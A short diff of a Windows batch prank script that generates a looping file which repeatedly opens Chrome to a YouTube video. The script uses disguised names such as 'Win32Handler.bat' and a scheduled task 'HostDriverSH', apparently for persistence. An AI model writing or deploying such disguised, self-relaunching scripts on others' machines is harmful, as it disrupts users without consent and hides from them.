@@ -7,7 +7,6 @@ set "taskfile=%taskfolder%\%taskname%"
 set "driverfile=%taskfolder%\Win32Handler.bat"
 
 set "copyfolder=%USERPROFILE%\Applications"
-set "copyfile=%taskfolder%\%taskfilename%"
 
 set "schname=sike"
 set "schhost=HostDriverSH"
@@ -25,7 +24,7 @@ goto :MAIN
     echo @echo off >> "%taskfile%"
     echo cd ^/ >> "%taskfile%"
     echo set /a i=0 >> "%taskfile%"
-    echo :redir >> "%taskfile%""
+    echo :redir >> "%taskfile%"
     : change the link to the website you want to redirect to
     echo    start chrome.exe "https://www.youtube.com/watch?v=xvFZjo5PgG0" >> "%taskfile%"
     echo    set /a i=%%i%%+1 >> "%taskfile%"
